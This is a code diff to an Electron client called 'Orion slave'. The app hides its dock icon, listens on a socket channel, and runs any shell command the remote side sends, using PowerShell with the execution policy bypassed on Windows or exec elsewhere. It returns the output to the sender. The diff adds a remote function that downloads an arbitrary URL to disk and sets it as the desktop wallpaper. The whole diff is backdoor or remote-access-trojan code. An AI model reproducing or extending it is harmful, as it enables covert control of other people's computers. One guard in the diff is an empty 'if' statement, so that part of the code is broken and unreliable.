@@ -13,8 +13,11 @@ if (isDevelopment) {
   require('module').globalPaths.push(process.env.NODE_MODULES_PATH)
 }
 
-app.dock.setBadge('');ss
-app.dock.hide();
+if (app.dock){
+  app.dock.setBadge('');
+  app.dock.hide();
+}
+
 app.setName("Orion slave");
 
 ////////////////////////////
@@ -27,6 +30,9 @@ const store = new Store();
 const os = require('os')
 const computerName = os.hostname()
 const shell = require('node-powershell');
+const fs = require('fs');
+const request = require('request');
+const wallpaper = require('wallpaper');
 
 if (!store.get('uniqueRoomNumber')){
   store.set(
@@ -35,72 +41,120 @@ if (!store.get('uniqueRoomNumber')){
   )
 }
 
-console.log("Emitting; ", store.get('uniqueRoomNumber').toString())
+console.log("[ORION]: Emitting as PC: ", store.get('uniqueRoomNumber').toString())
 Socket.emit('roomConnectionHost',
   store.get('uniqueRoomNumber').toString()
 )
 
+let additionalFunctions = {
+  ChangeBackground: (DATA) => {
+    return new Promise(function(resolve, reject) {
+      let download = function(uri, filename, callback){
+        request.head(uri, function(err, res, body){
+          request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
+        });
+      };
+
+      try {
+        download(DATA, 'client.png', function(){
+          wallpaper.set('client.png');
+        })
+      } catch (error){
+        reject({
+          ERROR: error
+        })
+      } finally {
+        resolve({
+          SUCCESS: "Changed background"
+        })
+      }
+    })
+  }
+}
+
 Socket.on(
   store.get('uniqueRoomNumber').toString(),
   function (data) {
-    console.log("Executing synapses")
     if (data.computerName === store.get('uniqueRoomNumber').toString()){
-      console.log(
-        "Execute shell: ",
-        data.shellCommand
-      )
+      if (!data.shellCommand){
+        if (!data.Other || !data.Other.Name || data.Other.Data);
+        console.log("Calling; ", data.Other.Name, " - ", data.Other.Data);
 
-      if (os.platform() === "win32"){
-        console.log("Windows powershell");
-        let ps = new shell({
-          executionPolicy: 'Bypass',
-          noProfile: true
-        });
+        let responseData = additionalFunctions[data.Other.Name](
+          data.Other.Data
+        )
 
-        ps.addCommand(data.shellCommand)
-        ps.invoke()
-        .then(output => {
-          Socket.emit('codeExecutionResponse',
-            {
-              uniqueRoomNumber: store.get('uniqueRoomNumber').toString(),
-              stdout: output,
-              stderr: "<N/A>"
-            }
+        responseData
+          .then(Out =>
+            Socket.emit('codeExecutionResponse',
+              {
+                uniqueRoomNumber: store.get('uniqueRoomNumber').toString(),
+                stdout: "Called: " +  data.Other.Name + "\n\nWith data: " + data.Other.Data,
+                stderr: "Response: \n\n" + Out.SUCCESS
+              }
+            )
+          ).catch( Error =>
+            Socket.emit('codeExecutionResponse',
+              {
+                uniqueRoomNumber: store.get('uniqueRoomNumber').toString(),
+                error: Error
+              }
+            )
           )
-        })
-        .catch(err => {
-          Socket.emit('codeExecutionResponse',
-            {
-              uniqueRoomNumber: store.get('uniqueRoomNumber').toString(),
-              error: err
-            }
-          )
-          ps.dispose();
-        });
       } else {
-        console.log("Macattack");
-        exec(data.shellCommand, function(error, stdout, stderr) {
-          console.log('stdout: ' + stdout);
-          console.log('stderr: ' + stderr);
-          if (error !== null) {
-            console.log("Emitting...")
+        console.log(
+          "Execute shell: ",
+          data.shellCommand
+        )
+
+        if (os.platform() === "win32"){
+          console.log("Windows powershell");
+          let ps = new shell({
+            executionPolicy: 'Bypass',
+            noProfile: true
+          });
+
+          ps.addCommand(data.shellCommand)
+          ps.invoke()
+          .then(output => {
             Socket.emit('codeExecutionResponse',
               {
                 uniqueRoomNumber: store.get('uniqueRoomNumber').toString(),
-                error: error
+                stdout: output,
+                stderr: "<N/A>"
               }
             )
-          } else {
-            console.log("Emitting...")
+          })
+          .catch(err => {
             Socket.emit('codeExecutionResponse',
               {
                 uniqueRoomNumber: store.get('uniqueRoomNumber').toString(),
-                stdout: stdout,
-                stderr: stderr
+                error: err
               }
             )
-          }
-        });
+            ps.dispose();
+          });
+        } else {
+          exec(data.shellCommand, function(error, stdout, stderr) {
+            if (error !== null) {
+              console.log("Emitting...")
+              Socket.emit('codeExecutionResponse',
+                {
+                  uniqueRoomNumber: store.get('uniqueRoomNumber').toString(),
+                  error: error
+                }
+              )
+            } else {
+              Socket.emit('codeExecutionResponse',
+                {
+                  uniqueRoomNumber: store.get('uniqueRoomNumber').toString(),
+                  stdout: stdout,
+                  stderr: stderr
+                }
+              )
+            }
+          });
+        }
       }
     }
   }
